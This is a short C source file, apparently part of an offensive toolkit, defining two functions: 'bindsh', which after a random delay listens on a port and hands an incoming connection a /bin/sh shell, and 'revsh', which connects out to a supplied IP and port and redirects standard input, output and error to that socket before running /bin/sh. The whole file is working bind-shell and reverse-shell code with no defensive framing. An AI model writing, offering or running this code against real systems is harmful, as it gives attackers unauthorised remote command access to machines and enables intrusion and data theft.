#include <stdlib.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <unistd.h>
#include <arpa/inet.h>
#include "helper.h"

//bind shell setup. bind it to a port and it will be listening on that port
void bindsh(int port)
{
    int num = (rand() % (7 - 2 + 1)) + 2;
    //upper = max number
    //lower = least number
    sleep(num);

    //setting up the socket
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = INADDR_ANY;

    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    bind(sockfd, (struct sockaddr *)&addr, sizeof(addr));
    listen(sockfd, 0);

    int connfd = accept(sockfd, NULL, NULL);
    for (int i = 0; i < 3; i++)
    {
        dup2(connfd, i);
    }

    // execute the shell
    execve("/bin/sh", NULL, NULL);
}

void revsh(const char *ip, int port)
{
    // const char *ip = "127.0.0.1"; //this means localhost
    struct sockaddr_in addr;

    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    inet_aton(ip, &addr.sin_addr);

    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    connect(sockfd, (struct sockaddr *)&addr, sizeof(addr));

    for (int i = 0; i < 3; i++)
    {
        dup2(sockfd, i);
    }

    execve("/bin/sh", NULL, NULL);
}